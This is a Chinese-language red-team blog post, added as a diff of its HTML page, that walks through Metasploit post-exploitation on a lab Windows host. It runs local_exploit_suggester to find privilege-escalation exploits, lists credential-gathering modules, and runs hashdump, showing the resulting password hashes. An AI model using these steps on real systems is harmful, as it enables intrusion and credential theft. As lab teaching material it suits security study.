@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>Metasploit-后渗透Post的常用模块使用 | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Metasploit-后渗透Post的常用模块使用</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 12, 2019&nbsp;&nbsp;10:45:54</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%AD%A6%E5%99%A8%E5%BA%93/">武器库</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="后渗透操作"><a href="#后渗透操作" class="headerlink" title="后渗透操作"></a>后渗透操作</h2><blockquote>
+<p>在获取到一枚Meterpreter的shell之后，就可以进行下一步的渗透，这就是传说中的后渗透了</p>
+</blockquote>
+<p>那msf中的<code>post</code>模块就是一个后渗透模块，里面包含各种后渗透中有可能用到的功能，最多的就是信息收集。</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/427.png" alt="图片"></p>
+<p>那么我这边就模拟一下拿到<code>cmdshell</code>后的操作：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/428.png" alt="图片"></p>
+<p>可以看到，我这边<code>sessions</code>是有一个<code>meterpreter</code>会话：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; sessions </span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                Connection</span><br><span class="line">  --  ----  ----                     -----------                ----------</span><br><span class="line">  1         meterpreter x64/windows  liuwx-PC\liuwx @ LIUWX-PC  192.168.119.136:8888 -&gt; 192.168.119.139:49162 (192.168.119.139)</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="在后渗透的时候，我们可以使用post模块辅助我们"><a href="#在后渗透的时候，我们可以使用post模块辅助我们" class="headerlink" title="在后渗透的时候，我们可以使用post模块辅助我们"></a>在后渗透的时候，我们可以使用post模块辅助我们</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">post/multi/recon/local_exploit_suggester</span><br><span class="line">post/windows/gather/hashdump</span><br><span class="line">post/windows/gather/smart_hashdump</span><br><span class="line">post/multi/gather/firefox_creds</span><br><span class="line">post/multi/gather/ssh_credspost/windows/gather/enumapplicatio</span><br><span class="line">...等等</span><br></pre></td></tr></table></figure>
+
+<h3 id="post-multi-recon-local-exploit-suggester"><a href="#post-multi-recon-local-exploit-suggester" class="headerlink" title="post/multi/recon/local_exploit_suggester"></a>post/multi/recon/local_exploit_suggester</h3><p>假设我们拿到一个<code>cmdshell</code>，但是权限很小，那我们可以使用这个模块来建议我们提权：</p>
+<blockquote>
+<p>post/multi/recon/local_exploit_suggester</p>
+</blockquote>
+<p>下面是它的一个介绍:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; info post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line">       Name: Multi Recon Local Exploit Suggester</span><br><span class="line">     Module: post/multi/recon/local_exploit_suggester</span><br><span class="line">   Platform: Unknown, Windows, Netware, Android, Java, R, Ruby, Linux, Cisco, Juniper, Unifi, Brocade, Solaris, OSX, BSD, OpenBSD, BSDi, NetBSD, FreeBSD, AIX, HPUX, Irix, Unix, PHP, JavaScript, Python, NodeJS, Firefox, Mainframe, Multi, Hardware, Apple_iOS</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  sinn3r &lt;sinn3r@metasploit.com&gt;</span><br><span class="line">  Mo</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line">  Shell</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name             Current Setting  Required  Description</span><br><span class="line">  ----             ---------------  --------  -----------</span><br><span class="line">  SESSION                           yes       The session to run this module on</span><br><span class="line">  SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module suggests local meterpreter exploits that can be used. </span><br><span class="line">  The exploits are suggested based on the architecture and platform </span><br><span class="line">  that the user has a shell opened as well as the available exploits </span><br><span class="line">  in meterpreter. It&#x27;s important to note that not all local exploits </span><br><span class="line">  will be fired. Exploits are chosen based on these conditions: </span><br><span class="line">  session type, platform, architecture, and required default options.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>从上面的<code>banner</code>可以看到，它支持的平台挺多的，比如<code>windows</code>、<code>Android</code>…等等</p>
+<p>run运行后它会比较慢，因为它会查询<code>systeminfo</code>来看看那些补丁没打，从而探测可以使用那些<code>exploit</code>来进行提权：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/429.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line">[*] 192.168.119.139 - Collecting local exploits for x64/windows...</span><br><span class="line">[*] 192.168.119.139 - 11 exploit checks are being tried...</span><br><span class="line">[+] 192.168.119.139 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.119.139 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>run执行完毕后，msf给出了我们两个<code>exploit</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.</span><br><span class="line"></span><br><span class="line">exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.</span><br></pre></td></tr></table></figure>
+<p>我使用<code>ms10_092_schelevator</code>提权失败了，然后又下面这个成功提权！</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/431.png" alt="图片"></p>
+<h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><p><code>hashdump</code>是查询密码：</p>
+<p>因为有时候你得搜集密码来进行爆破别的用户</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/430.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">hack:1001:aad3b435b51404eeaad3b435b51404ee:f39934a2710a469b3c63ce1487794514:::</span><br><span class="line">liuwx:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2019/10/12/metasploit-8/">http://example.com/2019/10/12/metasploit-8/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Metasploit/"># Metasploit</a>
+                    
+                        <a href="/tags/Kali-Linux/"># Kali Linux</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/10/12/metasploit-9/">Metasploit之windows提权应用_UAC绕过</a>
+            
+            
+            <a class="next" rel="next" href="/2019/10/10/metasploit-7/">Metasploit与Nmap组合拳对内网进行Ms17-010(永恒之蓝)攻击</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
